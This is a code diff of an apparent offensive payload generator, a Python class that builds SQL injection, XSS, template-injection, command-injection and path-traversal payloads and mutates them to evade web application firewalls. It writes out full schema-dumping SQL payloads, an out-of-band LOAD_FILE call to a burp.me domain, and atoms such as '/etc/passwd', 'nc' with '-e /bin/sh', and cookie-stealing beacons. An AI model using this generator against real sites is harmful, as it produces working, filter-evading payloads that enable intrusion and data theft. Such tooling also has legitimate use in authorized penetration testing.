-                        "INSERT", "UPDATE", "DELETE", "DROP", "EXEC", "EXECUTE",
-                        "CAST", "CONVERT", "CHAR", "CONCAT", "SUBSTRING", "ASCII"],
-        "sql_func": ["CONCAT()", "CHAR()", "SUBSTRING()", "ASCII()", "LENGTH()",
-                     "VERSION()", "DATABASE()", "USER()", "CURRENT_USER",
-                     "LOAD_FILE()", "INTO OUTFILE", "INFORMATION_SCHEMA",
-                     "COUNT(*)", "GROUP_CONCAT()", "HEX()", "UNHEX()"],
-        "xss_open": ["<", "&lt;", "%3C", "\\u003c", "\\x3c", "&Tab;<", "&NewLine;<",
-                     "\\00003c", "&#60;", "&#x3c;"],
-        "xss_tag": ["script", "img", "svg", "iframe", "body", "input", "details",
-                    "video", "audio", "marquee", "math", "object", "embed",
-                    "link", "meta", "base", "form", "button", "select",
-                    "textarea", "style", "div", "span", "a", "p"],
-        "xss_event": ["onload", "onerror", "onmouseover", "onfocus", "onblur",
-                      "onanimationend", "ontransitionend", "onwheel", "onclick",
-                      "onsubmit", "onchange", "oninput", "onkeydown", "onkeyup",
-                      "onkeypress", "onmousedown", "onmouseup", "onmouseout",
-                      "ondblclick", "oncontextmenu", "ondrag", "ondragend",
-                      "ondragenter", "ondragleave", "ondragover", "ondragstart",
-                      "ondrop", "onscroll", "onresize", "ontouchstart",
-                      "ontouchend", "ontouchmove", "onpointerdown",
-                      "onpointerup", "onanimationstart", "onanimationiteration",
-                      "onafterprint", "onbeforeprint", "onbeforeunload",
-                      "onhashchange", "onmessage", "onoffline", "ononline",
-                      "onpagehide", "onpageshow", "onpopstate", "onstorage",
-                      "onunload", "oncopy", "oncut", "onpaste",
-                      "onabort", "oncanplay", "oncanplaythrough",
-                      "ondurationchange", "onemptied", "onended",
-                      "onloadeddata", "onloadedmetadata", "onloadstart",
-                      "onpause", "onplay", "onplaying", "onprogress",
-                      "onratechange", "onseeked", "onseeking", "onstalled",
-                      "onsuspend", "ontimeupdate", "onvolumechange", "onwaiting",
-                      "onshow", "ontoggle"],
-        "xss_js": ["alert(1)", "confirm(1)", "prompt(1)", "console.log(1)",
-                   "fetch('//x')", "eval('1')", "Function('1')()",
-                   "alert`1`", "alert.call(null,1)", "window['alert'](1)",
-                   "self['alert'](1)", "this['alert'](1)", "top['alert'](1)",
-                   "document['cookie']", "location='//x'",
-                   "navigator.sendBeacon('//x')", "new Image().src='//x'",
-                   "setTimeout('alert(1)')", "setInterval('alert(1)')",
+        "sql_string_break": ["'",'"',"`","''",'""',"\\'","\\\"","%27","%22"],
+        "sql_logic": ["OR","AND","XOR","NOT","&&","||","DIV"],
+        "sql_comment": ["--","#","/**/",";--",";#","-- -","/*!*/","--+","%23"],
+        "sql_keyword": ["SELECT","UNION","FROM","WHERE","SLEEP","BENCHMARK",
+                        "WAITFOR","DELAY","ORDER","GROUP","HAVING","LIMIT",
+                        "INSERT","UPDATE","DELETE","DROP","EXEC","EXECUTE",
+                        "CAST","CONVERT","CHAR","CONCAT","SUBSTRING","ASCII"],
+        "sql_func": ["CONCAT()","CHAR()","SUBSTRING()","ASCII()","LENGTH()",
+                     "VERSION()","DATABASE()","USER()","CURRENT_USER",
+                     "LOAD_FILE()","INTO OUTFILE","INFORMATION_SCHEMA",
+                     "COUNT(*)","GROUP_CONCAT()","HEX()","UNHEX()"],
+        "xss_open": ["<","&lt;","%3C","\\u003c","\\x3c","&Tab;<","&NewLine;<","&#60;","&#x3c;"],
+        "xss_tag": ["script","img","svg","iframe","body","input","details",
+                    "video","audio","marquee","math","object","embed",
+                    "link","meta","base","form","button","select","textarea",
+                    "style","div","span","a","p"],
+        "xss_event": ["onload","onerror","onmouseover","onfocus","onblur",
+                      "onanimationend","ontransitionend","onwheel","onclick",
+                      "onsubmit","onchange","oninput","onkeydown","onkeyup",
+                      "onkeypress","onmousedown","onmouseup","onmouseout",
+                      "ondblclick","oncontextmenu","ondrag","ondragend",
+                      "ondragenter","ondragleave","ondragover","ondragstart",
+                      "ondrop","onscroll","onresize","ontouchstart",
+                      "ontouchend","ontouchmove","onpointerdown",
+                      "onpointerup","onanimationstart","onanimationiteration",
+                      "onafterprint","onbeforeprint","onbeforeunload",
+                      "onhashchange","onmessage","onoffline","ononline",
+                      "onpagehide","onpageshow","onpopstate","onstorage",
+                      "onunload","oncopy","oncut","onpaste","onabort",
+                      "oncanplay","oncanplaythrough","ondurationchange",
+                      "onemptied","onended","onloadeddata","onloadedmetadata",
+                      "onloadstart","onpause","onplay","onplaying","onprogress",
+                      "onratechange","onseeked","onseeking","onstalled",
+                      "onsuspend","ontimeupdate","onvolumechange","onwaiting",
+                      "onshow","ontoggle"],
+        "xss_js": ["alert(1)","confirm(1)","prompt(1)","console.log(1)",
+                   "fetch('//x')","eval('1')","Function('1')()",
+                   "alert`1`","alert.call(null,1)","window['alert'](1)",
+                   "self['alert'](1)","this['alert'](1)","top['alert'](1)",
+                   "document['cookie']","location='//x'",
+                   "navigator.sendBeacon('//x')","new Image().src='//x'",
+                   "setTimeout('alert(1)')","setInterval('alert(1)')",
                    "requestAnimationFrame('alert(1)')",
                    "Promise.resolve().then(_=>alert(1))"],
-        "xss_context_break": ["\">", "'>", "``>", "}}>", "])>", "/>",
-                              "\"autofocus ", "' autofocus ",
-                              "\" onfocus=\"", "' onfocus='"],
-        "ssti_open": ["{{", "${", "#{", "<%=", "<%", "{%", "${{", "<#", "{{-", "${#",
-                      "<%#", "{{{", "[[", "{#"],
-        "ssti_close": ["}}", "}", "%>", "%}", "}}}", "%}}", "-}}", "]]", "#}"],
-        "ssti_expr": ["7*7", "7*'7'", "range(7)", "7..7", "1+1", "'x'*7",
-                      "config", "request", "self", "self.__class__",
-                      "''|attr('__class__')", "().__class__", "[].__class__",
-                      "cycler.__init__.__globals__", "lipsum.__globals__",
-                      "namespace.__init__.__globals__",
+        "xss_context_break": ["\">","'>","``>","}}>","])>", "/>",
+                              "\"autofocus ","' autofocus ",
+                              "\" onfocus=\"","' onfocus='"],
+        "ssti_open": ["{{","${","#{","<%=","<%","{%","${{","<#","{{-","${#",
+                      "<%#","{{{","[[","{#"],
+        "ssti_close": ["}}","}","%>","%}","}}}","%}}","-}}","]]","#}"],
+        "ssti_expr": ["7*7","7*'7'","range(7)","7..7","1+1","'x'*7",
+                      "config","request","self","self.__class__",
+                      "''|attr('__class__')","().__class__","[].__class__",
+                      "cycler.__init__.__globals__","lipsum.__globals__",
                       "''.__class__.__mro__[1].__subclasses__()",
                       "request.application.__globals__"],
-        "cmd_sep": [";", "|", "||", "&&", "&", "`", "$(", "\n", "%0a", "%0d%0a",
-                    "\\\n", "|&", ";{", "$IFS", "${IFS}", "%09"],
-        "cmd_exec": ["sleep", "id", "whoami", "uname", "ls", "pwd", "cat", "echo",
-                     "wget", "curl", "ping", "nslookup", "dig", "nc",
-                     "python", "perl", "ruby", "php", "bash", "sh",
-                     "powershell", "cmd", "certutil", "bitsadmin"],
-        "cmd_arg": ["5", "1", "-a", "/", "/etc/passwd", "-c 1",
-                    "-n 1 127.0.0.1", "-la", "/tmp", "http://x.test",
-                    "-e /bin/sh", "-i", "-p 80"],
-        "path_traversal": ["../", "..\\", "....//", "..;/", "%2e%2e%2f",
-                          "%252e%252e%252f", "..%252f", "..%c0%af",
-                          "..%c1%9c", "..%ef%bc%8f", "..%2f",
-                          "..\\\\\\\\", "..../", "..\\\\../"
-                          "%c0%ae%c0%ae/", "%c0%ae%c0%ae\\",
-                          "..%25%32%66", "..%25%35%63"],
-        "null_byte": ["%00", "\\0", "\\x00", "%0a", "%0d", "\x00"],
-        "whitespace": [" ", "\t", "\n", "\r", "%09", "%0a", "%0d", "/**/",
-                       "/*x*/", "/**x**/", "+", "%20", "%0b", "%0c",
-                       "/*!*/", "/*!50000*/"],
+        "cmd_sep": [";","|","||","&&","&","`","$(","\\n","%0a","%0d%0a",
+                    "\\|&",";{","$IFS","${IFS}","%09"],
+        "cmd_exec": ["sleep","id","whoami","uname","ls","pwd","cat","echo",
+                     "wget","curl","ping","nslookup","dig","nc",
+                     "python","perl","ruby","php","bash","sh",
+                     "powershell","cmd","certutil","bitsadmin"],
+        "cmd_arg": ["5","1","-a","/","/etc/passwd","-c 1",
+                    "-n 1 127.0.0.1","-la","/tmp","http://x.test",
+                    "-e /bin/sh","-i","-p 80"],
+        "path_traversal": ["../","..\\","....//","..;/","%2e%2e%2f",
+                          "%252e%252e%252f","..%252f","..%c0%af",
+                          "..%c1%9c","..%ef%bc%8f","..%2f",
+                          "..\\\\\\\\","..../","..\\\\../"
+                          "%c0%ae%c0%ae/","%c0%ae%c0%ae\\",
+                          "..%25%32%66","..%25%35%63"],
+        "null_byte": ["%00","\\0","\\x00","%0a","%0d"],
+        "whitespace": [" ","\\t","\\n","\\r","%09","%0a","%0d","/**/",
+                       "/*x*/","/**x**/","+","%20","%0b","%0c","/*!*/","/*!50000*/"],
     }
 
-    CATEGORIES = ["sqli", "xss", "ssti", "cmdi", "lfi", "xxe", "crlf", "redirect"]
+    CATEGORIES = ["sqli","xss","ssti","cmdi","lfi","xxe","crlf","redirect","polyglot"]
 
-    def __init__(self, learner: FeedbackLearner = None):
+    def __init__(self, learner: FeedbackLearner = None,
+                 grammar: GrammarValidator = None,
+                 encoder: AdaptiveEncodingRotation = None,
+                 waf_bypass: WAFBypassEngine = None,
+                 polyglot: PolyglotGenerator = None):
         self.learner = learner or FeedbackLearner()
+        self.grammar = grammar or GrammarValidator()
+        self.encoder = encoder or AdaptiveEncodingRotation()
+        self.waf_bypass = waf_bypass or WAFBypassEngine()
+        self.polyglot = polyglot or PolyglotGenerator()
         self.generated_payloads: List[Dict] = []
         self.rng = random.Random()
         self.payload_counter = 0
-        self._build_techniques()
 
-    def _build_techniques(self):
-        """Build all 20 mutation/obfuscation techniques."""
-        self.mutation_techniques = [
-            self._mut_case_variation,
-            self._mut_comment_injection,
-            self._mut_whitespace_padding,
-            self._mut_char_encoding,
-            self._mut_string_concat,
-            self._mut_null_byte_append,
-            self._mut_unicode_normalize,
-            self._mut_double_encoding,
-            self._mut_html_entity_mix,
-            self._mut_nested_encoding,
-            self._mut_keyword_split,
-            self._mut_alternative_syntax,
-            self._mut_homoglyph,
-            self._mut_backslash_escape,
-            self._mut_newline_injection,
-            self._mut_tab_separation,
-            self._mut_block_comment_wrap,
-            self._mut_inline_comment_split,
-            self._mut_recursive_encode,
-            self._mut_zero_width_insert,
-        ]
+    def _pick(self, key): return self.rng.choice(self.ATOMS[key])
 
-    # ---- Encoding functions (7+) ----
+    # ---- Encoding (preserved from v4.0) ----
     def _enc_raw(self, s): return s
     def _enc_url(self, s): return quote(s, safe="")
     def _enc_double_url(self, s): return quote(quote(s, safe=""), safe="")
@@ -1355,571 +2243,440 @@ class MLPayloadGenerator:
     def _enc_unicode(self, s):
         return "".join(f"\\u{ord(c):04x}" if random.random() < 0.4 else c for c in s)
     def _enc_html_entity(self, s):
-        methods = [
-            lambda c: f"&#{ord(c)};",
-            lambda c: f"&#x{ord(c):x};",
-            lambda c: f"&#{ord(c):05d};",
-        ]
-        return "".join(random.choice(methods)(c) if random.random() < 0.4 else c for c in s)
+        return "".join(f"&#{ord(c)};" if random.random() < 0.4 else c for c in s)
     def _enc_hex(self, s):
         return "".join(f"\\x{ord(c):02x}" if random.random() < 0.4 else c for c in s)
     def _enc_octal(self, s):
         return "".join(f"\\{ord(c):03o}" if random.random() < 0.4 else c for c in s)
     def _enc_mixed(self, s):
-        funcs = [self._enc_url, self._enc_unicode, self._enc_html_entity, self._enc_hex, self._enc_octal]
-        return random.choice(funcs)(s)
+        return random.choice([self._enc_url, self._enc_unicode, self._enc_html_entity,
+                              self._enc_hex, self._enc_octal])(s)
 
-    # ---- 20 Mutation techniques ----
+    # ---- 20+ Mutation techniques (preserved from v4.0) ----
     def _mut_case_variation(self, s):
         return "".join(c.upper() if random.random() < 0.5 else c.lower() for c in s)
-
     def _mut_comment_injection(self, s):
-        comments = ["/**/", "/*!*/", "/**x**/", "/*!50000*/", "/*x*/"]
-        result = s
-        for kw in ["SELECT", "UNION", "FROM", "WHERE", "AND", "OR", "script", "alert"]:
-            if kw.lower() in result.lower():
-                comment = random.choice(comments)
-                result = re.sub(
-                    re.escape(kw), f"{kw[:2]}{comment}{kw[2:]}",
-                    result, count=1, flags=re.I
-                )
-        return result
-
+        cs = ["/**/","/*!*/","/**x**/","/*!50000*/","/*x*/"]
+        r = s
+        for kw in ["SELECT","UNION","FROM","WHERE","AND","OR","script","alert"]:
+            if kw.lower() in r.lower():
+                c = random.choice(cs)
+                r = re.sub(re.escape(kw), f"{kw[:2]}{c}{kw[2:]}", r, count=1, flags=re.I)
+        return r
     def _mut_whitespace_padding(self, s):
-        ws_options = ["  ", "\t", "\n", "%09", "%0a", "%0d", "/**/", "/*x*/"]
-        ws = random.choice(ws_options)
+        ws = random.choice(["  ","\\t","\\n","%09","%0a","%0d","/**/","/*x*/"])
         return f"{ws}{s}{ws}"
-
     def _mut_char_encoding(self, s):
-        result = []
+        r = []
         for c in s:
-            r = random.random()
-            if r < 0.2: result.append(f"&#x{ord(c):x};")
-            elif r < 0.4: result.append(f"%{ord(c):02x}")
-            elif r < 0.5: result.append(f"\\x{ord(c):02x}")
-            else: result.append(c)
-        return "".join(result)
-
+            rv = random.random()
+            if rv < 0.2: r.append(f"&#x{ord(c):x};")
+            elif rv < 0.4: r.append(f"%{ord(c):02x}")
+            elif rv < 0.5: r.append(f"\\x{ord(c):02x}")
+            else: r.append(c)
+        return "".join(r)
     def _mut_string_concat(self, s):
         if len(s) < 4: return s
-        mid = len(s) // 2
-        method = random.choice(["plus", "concat", "join"])
-        if method == "plus": return f"'{s[:mid]}'+'{s[mid:]}'"
-        elif method == "concat": return f"CONCAT('{s[:mid]}','{s[mid:]}')"
-        else: return f"['{s[:mid]}','{s[mid:]}'].join('')"
-
-    def _mut_null_byte_append(self, s):
-        return s + random.choice(["%00", "\\0", "\\x00"])
-
+        m = len(s) // 2
+        meth = random.choice(["plus","concat","join"])
+        if meth == "plus": return f"'{s[:m]}'+'{s[m:]}'"
+        elif meth == "concat": return f"CONCAT('{s[:m]}','{s[m:]}')"
+        else: return f"['{s[:m]}','{s[m:]}'].join('')"
+    def _mut_null_byte_append(self, s): return s + random.choice(["%00","\\0","\\x00"])
     def _mut_unicode_normalize(self, s):
-        replacements = {
-            '/': ['⁄', '∕', '／'], '<': ['＜', '‹'], '>': ['＞', '›'],
-            '"': ['＂', '"'], "'": ["＇", "'"], '&': ['＆'],
-        }
-        result = list(s)
-        for i, c in enumerate(result):
-            if c in replacements and random.random() < 0.3:
-                result[i] = random.choice(replacements[c])
-        return "".join(result)
-
-    def _mut_double_encoding(self, s):
-        return self._enc_double_url(s)
-
-    def _mut_html_entity_mix(self, s):
-        return self._enc_html_entity(s)
-
+        reps = {'/':['⁄','∕','／'],'<':['＜','‹'],'>':['＞','›'],'"':['＂','"'],"'":["＇","'"],'&':['＆']}
+        r = list(s)
+        for i,c in enumerate(r):
+            if c in reps and random.random() < 0.3: r[i] = random.choice(reps[c])
+        return "".join(r)
+    def _mut_double_encoding(self, s): return self._enc_double_url(s)
+    def _mut_html_entity_mix(self, s): return self._enc_html_entity(s)
     def _mut_nested_encoding(self, s):
-        depth = random.randint(2, 3)
-        result = s
-        for _ in range(depth):
-            method = random.choice([self._enc_url, self._enc_html_entity, self._enc_hex])
-            result = method(result)
-        return result
-
+        r = s
+        for _ in range(random.randint(2,3)):
+            r = random.choice([self._enc_url, self._enc_html_entity, self._enc_hex])(r)
+        return r
     def _mut_keyword_split(self, s):
-        keywords = ["SELECT", "UNION", "script", "alert", "onerror", "onload"]
-        for kw in keywords:
+        for kw in ["SELECT","UNION","script","alert","onerror","onload"]:
             if kw.lower() in s.lower():
-                split_point = random.randint(1, len(kw)-1)
-                separator = random.choice(["/**/", "/*!*/", "/**x**/", "\t"])
-                replacement = f"{kw[:split_point]}{separator}{kw[split_point:]}"
-                s = re.sub(re.escape(kw), replacement, s, count=1, flags=re.I)
+                sp = random.randint(1, len(kw)-1)
+                sep = random.choice(["/**/","/*!*/","/**x**/","\\t"])
+                s = re.sub(re.escape(kw), f"{kw[:sp]}{sep}{kw[sp:]}", s, count=1, flags=re.I)
         return s
-
     def _mut_alternative_syntax(self, s):
-        replacements = {
-            "alert(": ["alert`", "alert.call(null,", "window['alert'](",
-                       "self['alert'](", "top['alert']("],
-            "SELECT": ["SELECT ALL", "SELECT DISTINCT", "SELECT TOP 1"],
-            "OR ": ["|| ", "OR/**/ ", "OR/*!*/ "],
-            "AND ": ["&& ", "AND/**/ ", "AND/*!*/ "],
+        reps = {
+            "alert(":["alert`","alert.call(null,","window['alert'](","self['alert']("],
+            "SELECT":["SELECT ALL","SELECT DISTINCT","SELECT TOP 1"],
+            "OR ":["|| ","OR/**/ "],"AND ":["&& ","AND/**/ "],
         }
-        for old, alternatives in replacements.items():
+        for old, alts in reps.items():
             if old.lower() in s.lower():
-                s = re.sub(re.escape(old), random.choice(alternatives), s, count=1, flags=re.I)
+                s = re.sub(re.escape(old), random.choice(alts), s, count=1, flags=re.I)
         return s
-
     def _mut_homoglyph(self, s):
-        homoglyphs = {
-            'a': ['а', 'ɑ'], 'e': ['е', 'ε'], 'o': ['о', 'ο'],
-            'i': ['і', 'ι'], 'c': ['с'], 'p': ['р'],
-        }
-        result = list(s)
-        for i, c in enumerate(result):
-            if c.lower() in homoglyphs and random.random() < 0.2:
-                result[i] = random.choice(homoglyphs[c.lower()])
-        return "".join(result)
-
+        h = {'a':['а','ɑ'],'e':['е','ε'],'o':['о','ο'],'i':['і','ι'],'c':['с'],'p':['р']}
+        r = list(s)
+        for i,c in enumerate(r):
+            if c.lower() in h and random.random() < 0.2: r[i] = random.choice(h[c.lower()])
+        return "".join(r)
     def _mut_backslash_escape(self, s):
-        result = []
-        for c in s:
-            if random.random() < 0.2 and c.isalpha():
-                result.append(f"\\{c}")
-            else:
-                result.append(c)
-        return "".join(result)
-
+        return "".join(f"\\{c}" if random.random() < 0.2 and c.isalpha() else c for c in s)
     def _mut_newline_injection(self, s):
-        newlines = ["\n", "\r\n", "%0a", "%0d%0a"]
-        nl = random.choice(newlines)
+        nl = random.choice(["\\n","\\r\\n","%0a","%0d%0a"])
         if len(s) > 5:
-            pos = random.randint(2, len(s)-2)
-            return s[:pos] + nl + s[pos:]
+            p = random.randint(2, len(s)-2)
+            return s[:p] + nl + s[p:]
         return s
-
     def _mut_tab_separation(self, s):
-        tabs = ["\t", "%09", "%0b"]
-        tab = random.choice(tabs)
+        tab = random.choice(["\\t","%09","%0b"])
         return s.replace(" ", tab) if " " in s else f"{tab}{s}{tab}"
-
     def _mut_block_comment_wrap(self, s):
-        padding = random.choice(["x" * 10, "a" * 20, "0" * 15])
-        return f"/*{padding}*/{s}/*{padding}*/"
-
+        pad = random.choice(["x"*10,"a"*20,"0"*15])
+        return f"/*{pad}*/{s}/*{pad}*/"
     def _mut_inline_comment_split(self, s):
-        return s.replace(" ", random.choice(["/**/", "/*!*/", "/**/"]))
-
+        return s.replace(" ", random.choice(["/**/","/*!*/","/**/"]))
     def _mut_recursive_encode(self, s):
-        target_chars = random.sample("'\"<>();", min(3, len("'\"<>();")))
-        result = list(s)
-        for i, c in enumerate(result):
-            if c in target_chars:
-                result[i] = f"%{ord(c):02x}"
-        return "".join(result)
-
+        tc = random.sample("'\"<>();",min(3,len("'\"<>();")))
+        return "".join(f"%{ord(c):02x}" if c in tc else c for c in s)
     def _mut_zero_width_insert(self, s):
-        zw_chars = ["\u200b", "\u200c", "\u200d", "\ufeff", "\u2060"]
-        result = list(s)
-        for i in range(len(result)):
-            if random.random() < 0.15:
-                result.insert(i, random.choice(zw_chars))
-        return "".join(result)
+        zw = ["\\u200b","\\u200c","\\u200d","\\ufeff","\\u2060"]
+        r = list(s)
+        for i in range(len(r)):
+            if random.random() < 0.15: r.insert(i, random.choice(zw))
+        return "".join(r)
 
-    def _pick(self, key: str):
-        return self.rng.choice(self.ATOMS[key])
-
-    # ---- PAYLOAD BUILDERS (ALL strategies) ----
-
-    def _build_sqli(self, length_tier: str) -> Tuple[str, str]:
-        strategies = [
-            "error_based", "union_based", "time_based", "boolean_based",
-            "stacked_query", "second_order", "out_of_band", "inline_comment",
-            "case_variation", "encoding_bypass", "nested_subquery",
-            "having_group", "order_by_probe", "limit_offset",
-            "between_like", "rlike_regexp", "procedure_analyse"
+    def _get_all_mutations(self):
+        return [
+            self._mut_case_variation, self._mut_comment_injection,
+            self._mut_whitespace_padding, self._mut_char_encoding,
+            self._mut_string_concat, self._mut_null_byte_append,
+            self._mut_unicode_normalize, self._mut_double_encoding,
+            self._mut_html_entity_mix, self._mut_nested_encoding,
+            self._mut_keyword_split, self._mut_alternative_syntax,
+            self._mut_homoglyph, self._mut_backslash_escape,
+            self._mut_newline_injection, self._mut_tab_separation,
+            self._mut_block_comment_wrap, self._mut_inline_comment_split,
+            self._mut_recursive_encode, self._mut_zero_width_insert,
         ]
-        strat = self.rng.choice(strategies)
-        q = self._pick("sql_string_break")
-        c = self._pick("sql_comment")
-        ws = self._pick("whitespace")
 
-        if strat == "error_based":
+    def _apply_mutations(self, payload: str, num: int = 0) -> str:
+        if num == 0: num = random.randint(0, 3)
+        muts = self._get_all_mutations()
+        # Filter out blocked mutations
+        blocked = self.learner.blocked_mutations
+        for _ in range(num):
+            m = random.choice(muts)
+            try: payload = m(payload)
+            except: continue
+        return payload
+
+    # ---- PAYLOAD BUILDERS (ALL from v4.0 preserved) ----
+    def _build_sqli(self, tier):
+        strats = ["error_based","union_based","time_based","boolean_based",
+                  "stacked_query","second_order","out_of_band","inline_comment",
+                  "case_variation","encoding_bypass","nested_subquery",
+                  "having_group","order_by_probe","limit_offset",
+                  "between_like","rlike_regexp","procedure_analyse"]
+        s = self.rng.choice(strats)
+        q = self._pick("sql_string_break"); c = self._pick("sql_comment"); ws = self._pick("whitespace")
+
+        if s == "error_based":
             l = self._pick("sql_logic")
-            if length_tier == "short":
-                return f"{q}{ws}{l}{ws}1=1{c}", strat
-            elif length_tier == "long":
-                return (f"{q}{ws}{l}{ws}(SELECT{ws}1{ws}FROM{ws}(SELECT{ws}"
-                        f"COUNT(*),CONCAT(0xdeadbeef,FLOOR(RAND(0)*2))x{ws}FROM{ws}"
-                        f"information_schema.tables{ws}GROUP{ws}BY{ws}x)a){c}"), strat
-            elif length_tier == "super_long":
-                func = self.rng.choice(["extractvalue", "updatexml", "geometrycollection"])
-                return (f"{q}{ws}AND{ws}{func}(1,CONCAT(0x7e,(SELECT{ws}"
-                        f"GROUP_CONCAT(table_name){ws}FROM{ws}information_schema.tables{ws}"
-                        f"WHERE{ws}table_schema=database(){ws}LIMIT{ws}0,1),0x7e)){c}"), strat
-            else:
-                return (f"{q}{ws}AND{ws}(SELECT{ws}1{ws}FROM{ws}(SELECT{ws}"
-                        f"COUNT(*),CONCAT((SELECT{ws}GROUP_CONCAT(column_name{ws}SEPARATOR{ws}0x3a){ws}"
-                        f"FROM{ws}information_schema.columns{ws}WHERE{ws}table_schema=database(){ws}"
-                        f"LIMIT{ws}0,5),FLOOR(RAND(0)*2))x{ws}FROM{ws}"
-                        f"information_schema.tables{ws}GROUP{ws}BY{ws}x)a){c}"), strat
-
-        elif strat == "union_based":
+            if tier == "short": return f"{q}{ws}{l}{ws}1=1{c}", s
+            return (f"{q}{ws}{l}{ws}(SELECT{ws}1{ws}FROM{ws}(SELECT{ws}"
+                    f"COUNT(*),CONCAT(0xdeadbeef,FLOOR(RAND(0)*2))x{ws}FROM{ws}"
+                    f"information_schema.tables{ws}GROUP{ws}BY{ws}x)a){c}"), s
+        elif s == "union_based":
             cols = self.rng.randint(1, 10)
             nulls = ",".join(["NULL"] * cols)
-            if length_tier == "short":
-                return f"{q}{ws}UNION{ws}SELECT{ws}{nulls}{c}", strat
-            elif length_tier == "long":
-                return (f"{q}{ws}UNION{ws}ALL{ws}SELECT{ws}{nulls},CONCAT(0x7e,VERSION(),0x7e),"
-                        f"{nulls}{ws}FROM{ws}information_schema.tables{c}"), strat
-            else:
-                return (f"{q}{ws}UNION{ws}ALL{ws}SELECT{ws}{nulls},CONCAT(0x7e,(SELECT{ws}"
-                        f"GROUP_CONCAT(schema_name){ws}FROM{ws}information_schema.schemata),0x7e),"
-                        f"{nulls}{ws}FROM{ws}information_schema.tables{ws}LIMIT{ws}0,1{c}"), strat
-
-        elif strat == "time_based":
-            delay = self.rng.choice([3, 5, 7, 10])
-            methods = [
-                f"{q};{ws}WAITFOR{ws}DELAY{ws}'0:0:{delay}'{c}",
-                f"{q}{ws}AND{ws}SLEEP({delay}){c}",
-                f"{q}{ws}AND{ws}(SELECT{ws}*{ws}FROM{ws}(SELECT(SLEEP({delay})))a){c}",
+            if tier == "short": return f"{q}{ws}UNION{ws}SELECT{ws}{nulls}{c}", s
+            return (f"{q}{ws}UNION{ws}ALL{ws}SELECT{ws}{nulls},CONCAT(0x7e,VERSION(),0x7e),"
+                    f"{nulls}{ws}FROM{ws}information_schema.tables{c}"), s
+        elif s == "time_based":
+            d = self.rng.choice([3,5,7,10])
+            return self.rng.choice([
+                f"{q};{ws}WAITFOR{ws}DELAY{ws}'0:0:{d}'{c}",
+                f"{q}{ws}AND{ws}SLEEP({d}){c}",
+                f"{q}{ws}AND{ws}(SELECT{ws}*{ws}FROM{ws}(SELECT(SLEEP({d})))a){c}",
                 f"{q};{ws}SELECT{ws}BENCHMARK(10000000,MD5(0xdead)){c}",
-                f"{q}{ws}AND{ws}IF(1=1,SLEEP({delay}),0){c}",
-                f"{q}{ws}OR{ws}SLEEP({delay}){c}",
-            ]
-            return self.rng.choice(methods), strat
-
-        elif strat == "boolean_based":
-            methods = [
-                f"{q}{ws}AND{ws}1=1", f"{q}{ws}AND{ws}1=2",
-                f"{q}{ws}OR{ws}1=1{c}", f"{q}{ws}OR{ws}1=2{c}",
+                f"{q}{ws}AND{ws}IF(1=1,SLEEP({d}),0){c}",
+            ]), s
+        elif s == "boolean_based":
+            return self.rng.choice([
+                f"{q}{ws}AND{ws}1=1",f"{q}{ws}AND{ws}1=2",
+                f"{q}{ws}OR{ws}1=1{c}",f"{q}{ws}OR{ws}1=2{c}",
                 f"{q}{ws}AND{ws}SUBSTRING(@@version,1,1)='5'",
                 f"{q}{ws}AND{ws}ASCII(SUBSTRING((SELECT{ws}database()),1,1))>64",
-                f"{q}{ws}AND{ws}(SELECT{ws}COUNT(*){ws}FROM{ws}information_schema.tables)>0",
-            ]
-            return self.rng.choice(methods), strat
-
-        elif strat == "stacked_query":
-            return f"{q};{ws}SELECT{ws}{self.rng.randint(1,999)}{c}", strat
-        elif strat == "second_order":
-            return f"{q};{ws}INSERT{ws}INTO{ws}logs{ws}VALUES('{q}){c}", strat
-        elif strat == "out_of_band":
-            domain = f"{self.rng.randint(1000,9999)}.burp.me"
-            return f"{q};{ws}SELECT{ws}LOAD_FILE(CONCAT('\\\\\\\\',(SELECT{ws}version()),'.{domain}\\\\a')){c}", strat
-        elif strat == "inline_comment":
-            return f"{q}/*!50000{ws}AND{ws}1=1*/{c}", strat
-        elif strat == "case_variation":
-            return self._mut_case_variation(f"{q} AnD 1=1 {c}"), strat
-        elif strat == "encoding_bypass":
-            return self._mut_char_encoding(f"{q} OR 1=1{c}"), strat
-        elif strat == "nested_subquery":
+            ]), s
+        elif s == "stacked_query": return f"{q};{ws}SELECT{ws}{self.rng.randint(1,999)}{c}", s
+        elif s == "second_order": return f"{q};{ws}INSERT{ws}INTO{ws}logs{ws}VALUES('{q}){c}", s
+        elif s == "out_of_band":
+            dom = f"{self.rng.randint(1000,9999)}.burp.me"
+            return f"{q};{ws}SELECT{ws}LOAD_FILE(CONCAT('\\\\\\\\',(SELECT{ws}version()),'.{dom}\\\\a')){c}", s
+        elif s == "inline_comment": return f"{q}/*!50000{ws}AND{ws}1=1*/{c}", s
+        elif s == "case_variation": return self._mut_case_variation(f"{q} AnD 1=1 {c}"), s
+        elif s == "encoding_bypass": return self._mut_char_encoding(f"{q} OR 1=1{c}"), s
+        elif s == "nested_subquery":
             return (f"{q}{ws}AND{ws}(SELECT{ws}1{ws}WHERE{ws}(SELECT{ws}1{ws}WHERE{ws}"
-                    f"(SELECT{ws}COUNT(*){ws}FROM{ws}information_schema.tables)>0))=1{c}"), strat
-        elif strat == "having_group":
-            return f"{q}{ws}HAVING{ws}1=1{c}", strat
-        elif strat == "order_by_probe":
-            return f"{q}{ws}ORDER{ws}BY{ws}{self.rng.randint(1,50)}{c}", strat
-        elif strat == "limit_offset":
-            return f"{q}{ws}LIMIT{ws}1{ws}OFFSET{ws}0{c}", strat
-        elif strat == "between_like":
-            return f"{q}{ws}AND{ws}1{ws}BETWEEN{ws}0{ws}AND{ws}2{c}", strat
-        elif strat == "rlike_regexp":
-            return f"{q}{ws}RLIKE{ws}'^.{self.rng.randint(1,10)}$'{c}", strat
-        elif strat == "procedure_analyse":
-            return f"{q}{ws}PROCEDURE{ws}ANALYSE(){c}", strat
+                    f"(SELECT{ws}COUNT(*){ws}FROM{ws}information_schema.tables)>0))=1{c}"), s
+        elif s == "having_group": return f"{q}{ws}HAVING{ws}1=1{c}", s
+        elif s == "order_by_probe": return f"{q}{ws}ORDER{ws}BY{ws}{self.rng.randint(1,50)}{c}", s
+        elif s == "limit_offset": return f"{q}{ws}LIMIT{ws}1{ws}OFFSET{ws}0{c}", s
+        elif s == "between_like": return f"{q}{ws}AND{ws}1{ws}BETWEEN{ws}0{ws}AND{ws}2{c}", s
+        elif s == "rlike_regexp": return f"{q}{ws}RLIKE{ws}'^.{self.rng.randint(1,10)}$'{c}", s
